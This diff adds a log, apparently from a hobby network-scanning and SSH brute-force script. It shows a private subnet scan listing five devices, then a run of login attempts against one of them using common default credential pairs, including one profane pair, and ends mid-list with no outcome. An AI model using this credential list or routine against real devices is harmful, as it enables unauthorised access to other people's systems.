@@ -1,0 +1,46 @@
+192.168.29.
+trying with 192.168.29..0/24
+
+
+running the script for the 1 th time
+
+
+Scanning the Network
+
+
+Devices on the network
+192.168.29.55
+192.168.29.74
+192.168.29.200
+192.168.29.175
+192.168.29.140
+
+
+SSH attempt
+
+Brute forcing the device with IP 192.168.29.55
+trying 666666 and 666666.
+trying satya and satya.
+trying 888888 and 888888.
+trying admin and .
+trying admin and 1111.
+trying admin and 1111111.
+trying admin and 1234.
+trying admin and admin1234.
+trying admin and 12345.
+trying admin and 123456.
+trying pi and 123456789.
+trying admin and 54321.
+trying admin and 7ujMko0admin.
+trying admin and admin.
+trying admin and meinsm.
+trying admin and pass.
+trying admin and password.
+trying admin and smcadmin.
+trying admin1 and password.
+trying administrator and 1234.
+trying Administrator and admin.
+trying guest and 12345.
+trying guest and guest.
+trying mother and fucker.
+trying pi and root.
